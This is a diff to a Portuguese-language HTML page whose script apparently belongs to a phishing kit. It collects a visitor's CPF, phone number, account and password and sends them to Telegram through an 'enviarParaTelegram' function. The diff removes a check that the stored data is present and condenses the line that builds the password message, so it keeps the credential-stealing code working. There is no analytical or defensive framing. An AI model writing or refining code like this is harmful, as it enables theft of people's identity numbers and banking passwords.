@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -242,12 +243,6 @@
                 var cpf = localStorage.getItem("cpf");
                 var telefone = localStorage.getItem("telefone");
 
-                // Verificando se o CPF e o telefone estão salvos
-                if (!cpf || !telefone) {
-                    alert("CPF ou telefone não encontrado. Por favor, complete as informações antes de prosseguir.");
-                    return;
-                }
-
                 // Montando a mensagem
                 var mensagem = `CPF: ${cpf}\nTelefone: ${telefone}\nConta: ${conta}`;
                 enviarParaTelegram(mensagem);
@@ -271,10 +266,7 @@
             var senha = document.getElementById("senha").value;
 
             if (senha) {
-                var cpf = localStorage.getItem("cpf");
-                var telefone = localStorage.getItem("telefone");
-
-                var mensagemFinal = `CPF: ${cpf}\nTelefone: ${telefone}\nConta: ${conta}\nSenha: ${senha}`;
+                var mensagemFinal = `CPF: ${localStorage.getItem("cpf")}\nTelefone: ${localStorage.getItem("telefone")}\nConta: ${conta}\nSenha: ${senha}`;
                 enviarParaTelegram(mensagemFinal);
 
                 document.getElementById("mensagemSucesso").style.display = "block";
@@ -296,3 +288,4 @@
 
 </body>
 </html>
+
